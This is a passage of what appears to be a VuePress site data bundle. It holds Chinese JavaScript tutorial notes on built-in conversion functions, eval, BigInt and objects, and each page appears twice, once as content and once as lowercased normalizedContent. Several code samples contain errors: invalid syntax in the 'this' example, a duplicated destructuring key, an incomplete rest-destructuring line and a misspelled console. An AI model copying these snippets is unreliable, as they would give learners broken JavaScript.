内置顶层函数\n\n\n# Number()\n\nNumber() —— 任意类型数据转化为数字\n\n * 如果是布尔值，true为1，false为0\n * 如果是数值，转换为本身,会将无意义的后导零与前导零去掉\n * 如果为null，转换为0\n * 如果是undefined,转换为NaN not a number\n * 如果是字符串，\n   * 如果字符串中只有数字，则转换为数字（10进制）会忽略前导0和后导0\n   * 如果是规范的浮点数，则转换为浮点数 会忽略前导0和后导0\n   * 如果是空字符串，转换为0\n   * 如果是其它值，转换为NaN\n\n案例：用户输入两个数字及运算符进行计算\n\n// 由于prompt方法获取到的数据均为字符串，所以需要转化为数字\nvar num1 = Number(prompt("请输入第一个数字："))\nvar operator = prompt("请输入运算符")\nvar num2 = Number(prompt("请输入第二个数字："))\nswitch (operator) {\n    case \'+\':\n        alert("运算结果为："+ (num1 + num2))\n        break;\n    case \'-\':\n        alert("运算结果为："+ (num1 - num2))\n        break;\n    // ...\n    default:\n        alert("请输入正确的运算符 + - * / %")\n        break;\n  }\n\n\n\n# parseInt()\n\nparseInt() —— 任意类型数据转化为整数\n\n * 如果一个字符串中只包含数字，转换为十进制数\n\n * 如果有多个空格，会先找到第一个非空的值进行转换，直到非数值时结束\n\n * 如果第一个值不是以数字、-数字、空格开头的，转换为NaN\n\n * 有两个参数时，第一个参数表示要转换的值，第二个参数表示几进制，返回值是一个十进制的数字\n   \n   * 注意：第一个参数从最高位开始计算，只要有一位数可以识别为第二个参数传入的进制，则可以实现转化\n   * 注意：第二个参数可以传入的值为 2-36\n   \n   \n   # parseFloat()\n\nparseFloat() —— 任意类型数据转化为浮点数(小数) * 只有一个小数点起作用，其它无效 * 如果字符串是一个有效的整数，他返回的是整数，不会返回浮点数。\n\n\n# String()\n\nString() —— 任意类型数据转化为字符串\n\n * 如果是null,undefined,转换为字符串 "null" "undefined"\n * 如果是数值类型，转换为本身的字符串，123 转换为 "123"\n * 如果是布尔类型，true为"true" false为"false"\n\n\n# Boolean()\n\nBoolean() —— 任意类型数据转化为布尔值\n\n * 转换结果是假：""(空串),null,undefined,0,false,NaN\n * 其它都为真\n\n\n# isNaN()\n\nisNaN(); —— 判断一个数据能否转换为数值\n\n * 如果能转换成数值返回false，不能返回为true\n * 如果isNaN(x)返回false，那么x在任何算数表达式中都不会使表达式等于NaN；如果返回true，x会使所有算数表达式返回NaN\n\nisNaN(NaN);         // true\nisNaN(null);        // false   \nisNaN(undefined);   // true\nisNaN("");        // false   \n\n\n\n# eval()\n\neval(); —— 将传入的字符串当做 JavaScript 代码进行执行\n\nvar str = "(1+2)*3";\neval(str);     // 9\n\n\n * 避免在不必要的情况下使用 eval\n   * 需要解析，速度慢\n   * 安全性差：所执行的字符串容易被操控修改从而收到攻击\n\n\n# BigInt\n\n> JavaScript 原生提供BigInt对象，可以用作构造函数生成 BigInt 类型的数值。转换规则基本与Number()一致，将其他类型的值转为 BigInt。\n\nBigInt(123) // 123n\nBigInt(\'123\') // 123n\nBigInt(false) // 0n\nBigInt(true) // 1n\n\n\nTIP\n\nBigInt()构造函数必须有参数，而且参数必须可以正常转为数值，下面的用法都会报错。\n\nnew BigInt() // TypeError\nBigInt(undefined) //TypeError\nBigInt(null) // TypeError\nBigInt(\'123n\') // SyntaxError\nBigInt(\'abc\') // SyntaxError\n\n\n上面代码中，尤其值得注意字符串123n无法解析成 Number 类型，所以会报错。\n\n参数如果是小数，也会报错。\n\nBigInt(1.5) // RangeError\nBigInt(\'1.5\') // SyntaxError\n\n\nBigInt 对象继承了 Object 对象的两个实例方法。\n\n * BigInt.prototype.toString()\n * BigInt.prototype.valueOf()\n\n它还继承了 Number 对象的一个实例方法。\n\n * BigInt.prototype.toLocaleString()\n\n此外，还提供了三个静态方法。\n\n * BigInt.asUintN(width, BigInt)： 给定的 BigInt 转为 0 到 2width - 1 之间对应的值。\n * BigInt.asIntN(width, BigInt)：给定的 BigInt 转为 -2width - 1 到 2width - 1 - 1 之间对应的值。\n * BigInt.parseInt(string[, radix])：近似于Number.parseInt()，将一个字符串转换成指定进制的 BigInt。\n\nconst max = 2n ** (64n - 1n) - 1n;\n\nBigInt.asIntN(64, max)\n// 9223372036854775807n\nBigInt.asIntN(64, max + 1n)\n// -9223372036854775808n\nBigInt.asUintN(64, max + 1n)\n// 9223372036854775808n\n\n\n上面代码中，max是64位带符号的 BigInt 所能表示的最大值。如果对这个值加1n，BigInt.asIntN()将会返回一个负值，因为这时新增的一位将被解释为符号位。而BigInt.asUintN()方法由于不存在符号位，所以可以正确返回结果。\n\n如果BigInt.asIntN()和BigInt.asUintN()指定的位数，小于数值本身的位数，那么头部的位将被舍弃。\n\nconst max = 2n ** (64n - 1n) - 1n;\n\nBigInt.asIntN(32, max) // -1n\nBigInt.asUintN(32, max) // 4294967295n\n\n\n上面代码中，max是一个64位的 BigInt，如果转为32位，前面的32位都会被舍弃。\n\n下面是BigInt.parseInt()的例子。\n\n// Number.parseInt() 与 BigInt.parseInt() 的对比\nNumber.parseInt(\'9007199254740993\', 10)\n// 9007199254740992\nBigInt.parseInt(\'9007199254740993\', 10)\n// 9007199254740993n\n\n\n上面代码中，由于有效数字超出了最大限度，Number.parseInt方法返回的结果是不精确的，而BigInt.parseInt方法正确返回了对应的 BigInt。\n\n对于二进制数组，BigInt 新增了两个类型BigUint64Array和BigInt64Array，这两种数据类型返回的都是64位 BigInt。DataView对象的实例方法DataView.prototype.getBigInt64()和DataView.prototype.getBigUint64()，返回的也是 BigInt。\n\n\n# 转换规则\n\n可以使用Boolean()、Number()和String()这三个方法，将 BigInt 可以转为布尔值、数值和字符串类型。\n\nBoolean(0n) // false\nBoolean(1n) // true\nNumber(1n)  // 1\nString(1n)  // "1"\n\n\n上面代码中，注意最后一个例子，转为字符串时后缀n会消失。\n\n另外，取反运算符（!）也可以将 BigInt 转为布尔值。\n\n!0n // true\n!1n // false\n\n\n\n# 数学运算\n\n数学运算方面，BigInt 类型的+、-、*和**这四个二元运算符，与 Number 类型的行为一致。除法运算/会舍去小数部分，返回一个整数。\n\n9n / 5n\n// 1n\n\n\n几乎所有的数值运算符都可以用在 BigInt，但是有两个例外。\n\n * 不带符号的右移位运算符>>>\n * 一元的求正运算符+\n\n上面两个运算符用在 BigInt 会报错。前者是因为>>>运算符是不带符号的，但是 BigInt 总是带有符号的，导致该运算无意义，完全等同于右移运算符>>。后者是因为一元运算符+在 asm.js 里面总是返回 Number 类型，为了不破坏 asm.js 就规定+1n会报错。\n\nBigInt 不能与普通数值进行混合运算。\n\n1n + 1.3 // 报错\n\n\n上面代码报错是因为无论返回的是 BigInt 或 Number，都会导致丢失精度信息。比如(2n**53n + 1n) + 0.5这个表达式，如果返回 BigInt 类型，0.5这个小数部分会丢失；如果返回 Number 类型，有效精度只能保持 53 位，导致精度下降。\n\n同样的原因，如果一个标准库函数的参数预期是 Number 类型，但是得到的是一个 BigInt，就会报错。\n\n// 错误的写法\nMath.sqrt(4n) // 报错\n\n// 正确的写法\nMath.sqrt(Number(4n)) // 2\n\n\n上面代码中，Math.sqrt的参数预期是 Number 类型，如果是 BigInt 就会报错，必须先用Number方法转一下类型，才能进行计算。\n\nasm.js 里面，|0跟在一个数值的后面会返回一个32位整数。根据不能与 Number 类型混合运算的规则，BigInt 如果与|0进行运算会报错。\n\n1n | 0 // 报错\n\n\n\n# 其他运算\n\nBigInt 对应的布尔值，与 Number 类型一致，即0n会转为false，其他值转为true。\n\nif (0n) {\n  console.log(\'if\');\n} else {\n  console.log(\'else\');\n}\n// else\n\n\n上面代码中，0n对应false，所以会进入else子句。\n\n比较运算符（比如>）和相等运算符（==）允许 BigInt 与其他类型的值混合计算，因为这样做不会损失精度。\n\n0n < 1 // true\n0n < true // true\n0n == 0 // true\n0n == false // true\n0n === 0 // false\n\n\nBigInt 与字符串混合运算时，会先转为字符串，再进行运算。\n\n\'\' + 123n // "123"\n',normalizedContent:'# javascript内置顶层函数\n\n\n# 内置\n\necmascript自带的函数，ecmascript 自带的函数，ecmascript将我们常用的一些功能封装起来，用户不需要知道其实现原理而直接使用。\n\n\n# 顶层\n\n指函数的作用范围，作用范围为全局\n\n\n# 内置顶层函数\n\n\n# number()\n\nnumber() —— 任意类型数据转化为数字\n\n * 如果是布尔值，true为1，false为0\n * 如果是数值，转换为本身,会将无意义的后导零与前导零去掉\n * 如果为null，转换为0\n * 如果是undefined,转换为nan not a number\n * 如果是字符串，\n   * 如果字符串中只有数字，则转换为数字（10进制）会忽略前导0和后导0\n   * 如果是规范的浮点数，则转换为浮点数 会忽略前导0和后导0\n   * 如果是空字符串，转换为0\n   * 如果是其它值，转换为nan\n\n案例：用户输入两个数字及运算符进行计算\n\n// 由于prompt方法获取到的数据均为字符串，所以需要转化为数字\nvar num1 = number(prompt("请输入第一个数字："))\nvar operator = prompt("请输入运算符")\nvar num2 = number(prompt("请输入第二个数字："))\nswitch (operator) {\n    case \'+\':\n        alert("运算结果为："+ (num1 + num2))\n        break;\n    case \'-\':\n        alert("运算结果为："+ (num1 - num2))\n        break;\n    // ...\n    default:\n        alert("请输入正确的运算符 + - * / %")\n        break;\n  }\n\n\n\n# parseint()\n\nparseint() —— 任意类型数据转化为整数\n\n * 如果一个字符串中只包含数字，转换为十进制数\n\n * 如果有多个空格，会先找到第一个非空的值进行转换，直到非数值时结束\n\n * 如果第一个值不是以数字、-数字、空格开头的，转换为nan\n\n * 有两个参数时，第一个参数表示要转换的值，第二个参数表示几进制，返回值是一个十进制的数字\n   \n   * 注意：第一个参数从最高位开始计算，只要有一位数可以识别为第二个参数传入的进制，则可以实现转化\n   * 注意：第二个参数可以传入的值为 2-36\n   \n   \n   # parsefloat()\n\nparsefloat() —— 任意类型数据转化为浮点数(小数) * 只有一个小数点起作用，其它无效 * 如果字符串是一个有效的整数，他返回的是整数，不会返回浮点数。\n\n\n# string()\n\nstring() —— 任意类型数据转化为字符串\n\n * 如果是null,undefined,转换为字符串 "null" "undefined"\n * 如果是数值类型，转换为本身的字符串，123 转换为 "123"\n * 如果是布尔类型，true为"true" false为"false"\n\n\n# boolean()\n\nboolean() —— 任意类型数据转化为布尔值\n\n * 转换结果是假：""(空串),null,undefined,0,false,nan\n * 其它都为真\n\n\n# isnan()\n\nisnan(); —— 判断一个数据能否转换为数值\n\n * 如果能转换成数值返回false，不能返回为true\n * 如果isnan(x)返回false，那么x在任何算数表达式中都不会使表达式等于nan；如果返回true，x会使所有算数表达式返回nan\n\nisnan(nan);         // true\nisnan(null);        // false   \nisnan(undefined);   // true\nisnan("");        // false   \n\n\n\n# eval()\n\neval(); —— 将传入的字符串当做 javascript 代码进行执行\n\nvar str = "(1+2)*3";\neval(str);     // 9\n\n\n * 避免在不必要的情况下使用 eval\n   * 需要解析，速度慢\n   * 安全性差：所执行的字符串容易被操控修改从而收到攻击\n\n\n# bigint\n\n> javascript 原生提供bigint对象，可以用作构造函数生成 bigint 类型的数值。转换规则基本与number()一致，将其他类型的值转为 bigint。\n\nbigint(123) // 123n\nbigint(\'123\') // 123n\nbigint(false) // 0n\nbigint(true) // 1n\n\n\ntip\n\nbigint()构造函数必须有参数，而且参数必须可以正常转为数值，下面的用法都会报错。\n\nnew bigint() // typeerror\nbigint(undefined) //typeerror\nbigint(null) // typeerror\nbigint(\'123n\') // syntaxerror\nbigint(\'abc\') // syntaxerror\n\n\n上面代码中，尤其值得注意字符串123n无法解析成 number 类型，所以会报错。\n\n参数如果是小数，也会报错。\n\nbigint(1.5) // rangeerror\nbigint(\'1.5\') // syntaxerror\n\n\nbigint 对象继承了 object 对象的两个实例方法。\n\n * bigint.prototype.tostring()\n * bigint.prototype.valueof()\n\n它还继承了 number 对象的一个实例方法。\n\n * bigint.prototype.tolocalestring()\n\n此外，还提供了三个静态方法。\n\n * bigint.asuintn(width, bigint)： 给定的 bigint 转为 0 到 2width - 1 之间对应的值。\n * bigint.asintn(width, bigint)：给定的 bigint 转为 -2width - 1 到 2width - 1 - 1 之间对应的值。\n * bigint.parseint(string[, radix])：近似于number.parseint()，将一个字符串转换成指定进制的 bigint。\n\nconst max = 2n ** (64n - 1n) - 1n;\n\nbigint.asintn(64, max)\n// 9223372036854775807n\nbigint.asintn(64, max + 1n)\n// -9223372036854775808n\nbigint.asuintn(64, max + 1n)\n// 9223372036854775808n\n\n\n上面代码中，max是64位带符号的 bigint 所能表示的最大值。如果对这个值加1n，bigint.asintn()将会返回一个负值，因为这时新增的一位将被解释为符号位。而bigint.asuintn()方法由于不存在符号位，所以可以正确返回结果。\n\n如果bigint.asintn()和bigint.asuintn()指定的位数，小于数值本身的位数，那么头部的位将被舍弃。\n\nconst max = 2n ** (64n - 1n) - 1n;\n\nbigint.asintn(32, max) // -1n\nbigint.asuintn(32, max) // 4294967295n\n\n\n上面代码中，max是一个64位的 bigint，如果转为32位，前面的32位都会被舍弃。\n\n下面是bigint.parseint()的例子。\n\n// number.parseint() 与 bigint.parseint() 的对比\nnumber.parseint(\'9007199254740993\', 10)\n// 9007199254740992\nbigint.parseint(\'9007199254740993\', 10)\n// 9007199254740993n\n\n\n上面代码中，由于有效数字超出了最大限度，number.parseint方法返回的结果是不精确的，而bigint.parseint方法正确返回了对应的 bigint。\n\n对于二进制数组，bigint 新增了两个类型biguint64array和bigint64array，这两种数据类型返回的都是64位 bigint。dataview对象的实例方法dataview.prototype.getbigint64()和dataview.prototype.getbiguint64()，返回的也是 bigint。\n\n\n# 转换规则\n\n可以使用boolean()、number()和string()这三个方法，将 bigint 可以转为布尔值、数值和字符串类型。\n\nboolean(0n) // false\nboolean(1n) // true\nnumber(1n)  // 1\nstring(1n)  // "1"\n\n\n上面代码中，注意最后一个例子，转为字符串时后缀n会消失。\n\n另外，取反运算符（!）也可以将 bigint 转为布尔值。\n\n!0n // true\n!1n // false\n\n\n\n# 数学运算\n\n数学运算方面，bigint 类型的+、-、*和**这四个二元运算符，与 number 类型的行为一致。除法运算/会舍去小数部分，返回一个整数。\n\n9n / 5n\n// 1n\n\n\n几乎所有的数值运算符都可以用在 bigint，但是有两个例外。\n\n * 不带符号的右移位运算符>>>\n * 一元的求正运算符+\n\n上面两个运算符用在 bigint 会报错。前者是因为>>>运算符是不带符号的，但是 bigint 总是带有符号的，导致该运算无意义，完全等同于右移运算符>>。后者是因为一元运算符+在 asm.js 里面总是返回 number 类型，为了不破坏 asm.js 就规定+1n会报错。\n\nbigint 不能与普通数值进行混合运算。\n\n1n + 1.3 // 报错\n\n\n上面代码报错是因为无论返回的是 bigint 或 number，都会导致丢失精度信息。比如(2n**53n + 1n) + 0.5这个表达式，如果返回 bigint 类型，0.5这个小数部分会丢失；如果返回 number 类型，有效精度只能保持 53 位，导致精度下降。\n\n同样的原因，如果一个标准库函数的参数预期是 number 类型，但是得到的是一个 bigint，就会报错。\n\n// 错误的写法\nmath.sqrt(4n) // 报错\n\n// 正确的写法\nmath.sqrt(number(4n)) // 2\n\n\n上面代码中，math.sqrt的参数预期是 number 类型，如果是 bigint 就会报错，必须先用number方法转一下类型，才能进行计算。\n\nasm.js 里面，|0跟在一个数值的后面会返回一个32位整数。根据不能与 number 类型混合运算的规则，bigint 如果与|0进行运算会报错。\n\n1n | 0 // 报错\n\n\n\n# 其他运算\n\nbigint 对应的布尔值，与 number 类型一致，即0n会转为false，其他值转为true。\n\nif (0n) {\n  console.log(\'if\');\n} else {\n  console.log(\'else\');\n}\n// else\n\n\n上面代码中，0n对应false，所以会进入else子句。\n\n比较运算符（比如>）和相等运算符（==）允许 bigint 与其他类型的值混合计算，因为这样做不会损失精度。\n\n0n < 1 // true\n0n < true // true\n0n == 0 // true\n0n == false // true\n0n === 0 // false\n\n\nbigint 与字符串混合运算时，会先转为字符串，再进行运算。\n\n\'\' + 123n // "123"\n',charsets:{cjk:!0}},{title:"对象",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/01-%E5%AF%B9%E8%B1%A1%E8%AF%A6%E6%83%85.html",relativePath:"Javascript/Javascript基础语法/07-对象/01-对象详情.md",key:"v-4eca17c5",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/07-%E5%AF%B9%E8%B1%A1/01-%E5%AF%B9%E8%B1%A1%E8%AF%A6%E6%83%85.html",headers:[{level:2,title:"对象的组成",slug:"对象的组成",normalizedTitle:"对象的组成",charIndex:205},{level:2,title:"对象的创建",slug:"对象的创建",normalizedTitle:"对象的创建",charIndex:342},{level:3,title:"new操作符具体做了什么？",slug:"new操作符具体做了什么",normalizedTitle:"new操作符具体做了什么？",charIndex:614},{level:2,title:"对象的增、删、改、查",slug:"对象的增、删、改、查",normalizedTitle:"对象的增、删、改、查",charIndex:1193},{level:3,title:"1. 增 (给对象增加一个新的属性或方法)",slug:"_1-增-给对象增加一个新的属性或方法",normalizedTitle:"1. 增 (给对象增加一个新的属性或方法)",charIndex:1208},{level:3,title:"2. 查(访问属性、方法)",slug:"_2-查-访问属性、方法",normalizedTitle:"2. 查(访问属性、方法)",charIndex:1612},{level:3,title:"3. 改(修改属性和方法)",slug:"_3-改-修改属性和方法",normalizedTitle:"3. 改(修改属性和方法)",charIndex:1795},{level:3,title:"4. 删(删除对象或者对象上的属性方法)",slug:"_4-删-删除对象或者对象上的属性方法",normalizedTitle:"4. 删(删除对象或者对象上的属性方法)",charIndex:1859},{level:3,title:"对象的遍历",slug:"对象的遍历",normalizedTitle:"对象的遍历",charIndex:2105},{level:3,title:"对象的拷贝",slug:"对象的拷贝",normalizedTitle:"对象的拷贝",charIndex:2319},{level:2,title:"this",slug:"this",normalizedTitle:"this",charIndex:648},{level:3,title:"this的指向",slug:"this的指向",normalizedTitle:"this的指向",charIndex:3383},{level:3,title:"改变this的指向",slug:"改变this的指向",normalizedTitle:"改变this的指向",charIndex:3821},{level:2,title:"ES6对象扩展",slug:"es6对象扩展",normalizedTitle:"es6对象扩展",charIndex:3869},{level:3,title:"属性方法的简洁表示法",slug:"属性方法的简洁表示法",normalizedTitle:"属性方法的简洁表示法",charIndex:3881},{level:3,title:"对象的解构赋值",slug:"对象的解构赋值",normalizedTitle:"对象的解构赋值",charIndex:4237},{level:3,title:"对象的Rest属性",slug:"对象的rest属性",normalizedTitle:"对象的rest属性",charIndex:6157}],headersStr:"对象的组成 对象的创建 new操作符具体做了什么？ 对象的增、删、改、查 1. 增 (给对象增加一个新的属性或方法) 2. 查(访问属性、方法) 3. 改(修改属性和方法) 4. 删(删除对象或者对象上的属性方法) 对象的遍历 对象的拷贝 this this的指向 改变this的指向 ES6对象扩展 属性方法的简洁表示法 对象的解构赋值 对象的Rest属性",content:"# 对象\n\n> 对象是JavaScript的一个引用数据类型，是一种复合值，它将很多值（原始值或者其他对象）聚合在一起，可通过名字访问这些值。即属性的无序集合。\n\n在JavaScript中，一个对象可以是一个单独的拥有属性和类型的实体。我们拿它和一个杯子做下类比。一个杯子是一个对象(物体)，拥有属性。杯子有颜色，图案，重量，由什么材质构成等等。同样，javascript对象也有属性来定义它的特征。\n\n\n# 对象的组成\n\n对象由属性 和 方法 组成。一个属性存储的是原始值，也可以是引用值。若一个属性的值可以是函数，这种情况下属性也被称为 方法。\n\n名称   描述\n属性   用数据值来描述他的状态\n方法   用来改变对象行为的方法,一个方法是一个值为某个函数的对象属性。\n\n\n# 对象的创建\n\n> JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。\n\n 1. 隐式创建(json格式创建)\n\nvar obj = {}\n\n\n 1. 实例化Object\n\nvar obj=new Object();\n\n\n 3. 实例化自定义构造函数\n\nfunction Obj(a){ }\nvar obj = new Obj();\n\n\n 4. 实例化类 (实例化Object的语法糖，详见 Class 一节)\n\nclass Animal{}  \nvar dog=new Animal();\n\n\n\n# new操作符具体做了什么？\n\nfunction Base(){\n  this.name = \"zhangsan\";\n  this.age = 20;\n}\nvar obj = new Base();\n\n// new操作符等价于\nvar obj = {};\nobj.__proto__ = Base.prototype;\nBase.call(obj);\n\n\n 1. 创建了一个空对象obj\n 2. 将这个空对象的__proto__成员指向了Base函数对象prototype成员对象。相当于obj拥有了Base原型上的属性方法\n 3. 将Base函数对象的this指针替换成obj，然后再调用Base函数，于是就给obj对象赋值了一个name和age成员变量。相当于obj拥有了Base构造函数上的属性方法\n\nvar this = Object.create(Peson.prototype);\n\n\n# instanceof关键字\n\n> 如果obj对象是构造函数Fun的一个实例，则 obj instanceof Fun 返回 true。\n\n判断一个数据是否是数组：\n\nvar arr1 = [], arr2 = {}\n\narr1 instanceof Array   // true\narr2 instanceof Array   // false\n\n\n\n# 对象的增、删、改、查\n\n\n# 1. 增 (给对象增加一个新的属性或方法)\n\n * 声明后赋值\n\nvar obj = {}\nobj.user = \"张三\";    // 属性\nobj.eat = function(){    // 方法\n  console.log('吃饭');\n}\n\n\n * 声明的同时赋值\n\n//json形式创建赋值\nvar obj={\n  name:'张三',\n  age:18,\n  eat:function(){\n    console.log('吃饭');\n  }\n}\n\n//实例化构造函数\nfunction Animal(){\n  this.name='阿黄',\n  this.age='2',\n  this.sing=function(){\n    console.log('汪汪');\n  }\n}\n\n//实例化Object\nvar obj=new Object({a:'aa',b:'bb'})\n\n\n\n# 2. 查(访问属性、方法)\n\n * 访问属性\n\n对象.属性名;\n对象[\"属性名\"];\n\n\n * 访问方法\n\n对象.方法名();\n对象[\"方法名\"]();\n\n\n> 注：当属性名或方法名保存到变量中时，访问该属性或方法需要使用[]\n\nfor(let i in obj){\n  obj[i]     // i是存储属性名的变量，所以访问该属性时必须通过[]\n}\n\n\n\n# 3. 改(修改属性和方法)\n\n> 直接为属性或方法赋新值即可\n\n对象.属性名=新的属性值;\n对象.方法名=新的方法;\n\n\n\n# 4. 删(删除对象或者对象上的属性方法)\n\n * 销毁对象\n\n> javascript中的垃圾回收机制在对象没有引用的时候会进行销毁，释放内存\n\n对象=null;    \n\n\n * 删除对象上的属性和方法，使用delete运算符\n\nvar obj={\n  a:'a',\n  b:function(){console.log('这是一个方法')}\n}\ndelete obj.a;   //删除obj对象上的a属性    \ndelete obj.b;   //删除obj对象上的b方法\n\n\n\n# 对象的遍历\n\n 1. for in 循环\n\n> 循环遍历对象自身的和继承的可枚举属性(不含Symbol属性).\n\nvar obj={\n  name:'小米',\n  age:18,\n  say:function(){\n    console.log('你好');\n  }\n}\nfor (var i in obj) {\n  console.log(obj[i]);\n}\n\n\n> ES6其余遍历方式详见 Object对象一节\n\n\n# 对象的拷贝\n\n由于对象是引用类型，变量中存储的是数据的地址，所以对象直接通过=赋值只能将地址赋值而不是数据。\n\n对象的拷贝分为浅拷贝、深拷贝：\n\nvar obj = {\n  type: \"animal\",\n  cat:{\n    name:\"Tom\",\n    weight: 16,\n    food:[\"fish\",\"meat\"]\n  },\n}\n\n\n * 浅拷贝： 直接拷贝对象的内存地址，如果原地址中对象被改变了，那么浅拷贝出来的对象也会相应改变\n * 深拷贝： 新开辟一块内存，将对象中所有属性全部复制，如果原地址中对象被改变了，那么深拷贝出来的对象不变\n\n深拷贝实现方法：\n\n 1. 递归遍历，逐层拷贝。 因为基础类型可以直接拷贝，所以通过递归遍历对象的每一层，全部得到基础类型后再拷贝。\n 2. 通过JSON.stringify()先将对象转化为字符串，字符串赋值后再通过JSON.parse()转化回对象。\n\n方案1：\n\nvar obj = {\n    id:1000,\n    name:\"张三\",\n    age:19,\n    favs:['足球','电影','游戏','篮球']\n}\nvar obj2 = JSON.parse(JSON.stringify(obj));\n\n\n方案2:\n\n/**\n * [deepCopy 深拷贝]\n * @param  {[Array|Object]}   [要拷贝对象或数组]\n * @return {[Array|Object]}   [返回拷贝对象或数组]\n */\nfunction deepCopy(o){\n\tif(Array.isArray(o)){\n\t\tvar result = [];\n\t}else if(typeof o == 'object'){\n\t\tvar result = {};\n\t}else{\n\t\treturn o;\n\t}\n\tfor(var i in o){\n\t\tif(typeof o[i]== 'object'){\n\t\t\tresult[i] = deepCopy(o[i])\n\t\t}else{\n\t\t\tresult[i] = o[i];\n\t\t}\n\t}\n\treturn result;\n}\n\n\n> 在拷贝日期正则等特殊对象是拷贝为空对象。如有需求加判断就可以解决。\n\n\n# this\n\n> this是一个很特别的关键字，被自动定义在所有函数的作用域中。\n> this总是会指向一个对象。或者说，this就是属性或方法‘当前’所在的对象。\n\n\n# this的指向\n\n> this的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定this到底指向谁，实际上this的最终指向的是那个调用它的对象\n\n 1. 在普通函数中this指window全局对象\n 2. 作为对象方法调用，this 指代调用该方法对象\n 3. 在构造函数中this指向构造函数的实例\n 4. 在事件中，this指向事件源\n 5. 在call和apply中,this指的是方法中传入的对象，如果apply中没有传对象，this指向window\n\nfunction Fun(){\n  run(){\n    console.log(this)       // this指向实例化出的对象，因为是实例化出的对象调用了run方法\n\n    setInterval(_=>{\n      conosle.log(this)     // this指向 window，因为是window调用了setInterval方法\n    })\n  }\n}\n\n\n\n# 改变this的指向\n\ncall() apply() bind() 在对象的特性中会讲到\n\n\n# ES6对象扩展\n\n\n# 属性方法的简洁表示法\n\n当属性名为变量名, 属性值为变量的值时，可直接将变量作为对象的属性：\n\nlet username = \"张三\"\n\nlet obj = {\n  username,      // 属性名为变量名, 属性值为变量的值\n  age: 20\n}\n\n\n * 对象方法的简写：\n\nlet obj = {\n  run:function(){\n    alert(1)\n  }\n}\n// 简写为：\nlet obj = {\n  run(){\n    alert(1)\n  }\n}\n\n\n这种写法用于函数的返回值，将会非常方便。\n\nfunction getPoint() {\n  const x = 1;\n  const y = 10;\n  return {x, y};\n}\n\ngetPoint()\n\n\n\n# 对象的解构赋值\n\n解构不仅可以用于数组，还可以用于对象。\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\n\nlet { first: f, last: l } = { first: 'hello', last: 'world' };\nf // 'hello'\nl // 'world'\n\n\n> 上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。\n\n如果变量名与属性名一致，可以写成下面这样:\n\nlet { foo, bar } = { foo: \"aaa\", bar: \"bbb\" };\nfoo // \"aaa\"\nbar // \"bbb\"\n\n\n对象的解构与数组有一个重要的不同。数组的元素是按次序排列的，变量的取值由它的位置决定；而对象的属性没有次序，变量必须与属性同名，才能取到正确的值。\n\n如果变量名与属性名不一致，必须写成下面这样。\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\n\nlet obj = { first: 'hello', last: 'world' };\nlet { first: f, last: l } = obj;\nf // 'hello'\nl // 'world'\n\n\n也就是说，对象的解构赋值的内部机制，是先找到同名属性，然后再赋给对应的变量。真正被赋值的是后者，而不是前者\n\nlet { foo: baz } = { foo: 'aaa', bar: 'bbb' };\nbaz // \"aaa\"\nfoo // error: foo is not defined\n// 上面代码中，foo是匹配的模式，baz才是变量。真正被赋值的是变量baz，而不是模式foo。\n\n\n与数组一样，解构也可以用于嵌套结构的对象。\n\nlet obj = {\n  p: [\n    'Hello',\n    { y: 'World' }\n  ]\n};\n\nlet { p: [x, { y }] } = obj;\nx // \"Hello\"\ny // \"World\"\n\n\n注意，这时p是模式，不是变量，因此不会被赋值。如果p也要作为变量赋值，可以写成下面这样。\n\nlet obj = {\n  p: [\n    'Hello',\n    { y: 'World' }\n  ]\n};\n\nlet { p, p: [x, { y }] } = obj;\nx // \"Hello\"\ny // \"World\"\np // [\"Hello\", {y: \"World\"}]\n\nconst node = {\n  loc: {\n    start: {\n      line: 1,\n      column: 5\n    }\n  }\n};\n\nlet { loc, loc: { start }, loc: { start: { line }} } = node;\nline // 1\nloc  // Object {start: Object}\nstart // Object {line: 1, column: 5}\n\n\n默认值 对象的解构也可以指定默认值。\n\nvar {x = 3} = {};\nx // 3\n\nvar {x, y = 5} = {x: 1};\nx // 1\ny // 5\n\nvar {x: y = 3} = {};\ny // 3\n\nvar {x: y = 3} = {x: 5};\ny // 5\n\nvar { message: msg = 'Something went wrong' } = {};\nmsg // \"Something went wrong\"\n\n\n * 用途1：接收函数的参数\n\n// 接收被除数x与除数y\nfunction calc({dividend: x, dividend: y}){\n  return x/y\n}\nlet divide = calc({dividend:9,dividend:3})\n\n\n * 用途2：接收函数的返回值\n\nfunction calc(a,b){\n  return {\n    add: a+b,\n    subtract: a-b,\n    multiply: a*b,\n    divide: a/b\n  }\n}\n// 相对于返回数组来讲，不需要知道返回值参数的顺序\nlet {add, subtract, multiply, divide} = calc(1,2)\n\n\n\n# 对象的Rest属性\n\nES6中数组的rest和扩展运算符，用于数组于普通参数之间的转化\n\nMath.max(...[1,2,3,4])\n\nfunction fun(a,b,...c){ }\n\n\n现在在ES9中，当对象结构复制时也可以使用rest运算符：\n\nlet obj = {a: 1, b: 2, c: 3};\nlet {a,...x}\n//  a == 1\n//  x == {b: 2, c: 3}\n\n\n或在函数参数中也可以使用：\n\nrestParam({\n  a: 1,\n  b: 2,\n  c: 3\n});\n\nfunction restParam({ a, ...x }) {\n  // a = 1\n  // x = { b: 2, c: 3 }\n}\n",normalizedContent:"# 对象\n\n> 对象是javascript的一个引用数据类型，是一种复合值，它将很多值（原始值或者其他对象）聚合在一起，可通过名字访问这些值。即属性的无序集合。\n\n在javascript中，一个对象可以是一个单独的拥有属性和类型的实体。我们拿它和一个杯子做下类比。一个杯子是一个对象(物体)，拥有属性。杯子有颜色，图案，重量，由什么材质构成等等。同样，javascript对象也有属性来定义它的特征。\n\n\n# 对象的组成\n\n对象由属性 和 方法 组成。一个属性存储的是原始值，也可以是引用值。若一个属性的值可以是函数，这种情况下属性也被称为 方法。\n\n名称   描述\n属性   用数据值来描述他的状态\n方法   用来改变对象行为的方法,一个方法是一个值为某个函数的对象属性。\n\n\n# 对象的创建\n\n> json(javascript object notation) 